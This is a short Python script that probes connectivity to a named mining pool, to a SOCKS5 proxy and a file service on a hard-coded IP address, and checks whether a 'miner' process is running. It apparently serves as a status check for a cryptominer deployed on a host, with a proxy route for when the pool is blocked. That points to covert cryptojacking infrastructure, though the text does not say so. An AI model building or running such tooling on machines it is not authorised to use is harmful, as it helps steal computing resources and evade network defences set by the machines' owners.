import socket, subprocess as sp

results = []

try:
    s = socket.socket()
    s.settimeout(5)
    s.connect(("sg1.alphapool.tech", 5566))
    s.close()
    results.append("POOL: DIRECT OK")
except Exception as e:
    results.append("POOL: BLOCKED")

try:
    s = socket.socket()
    s.settimeout(8)
    s.connect(("151.247.219.40", 1080))
    s.close()
    results.append("SOCKS5: OK")
except Exception as e:
    results.append("SOCKS5: BLOCKED")

try:
    s = socket.socket()
    s.settimeout(5)
    s.connect(("151.247.219.40", 8000))
    s.close()
    results.append("FILES: OK")
except Exception as e:
    results.append("FILES: BLOCKED")

p = sp.run(["ps", "aux"], capture_output=True, text=True)
if "miner" in p.stdout.lower():
    results.append("MINER: RUNNING")
else:
    results.append("MINER: NOT RUNNING")

result = " | ".join(results)
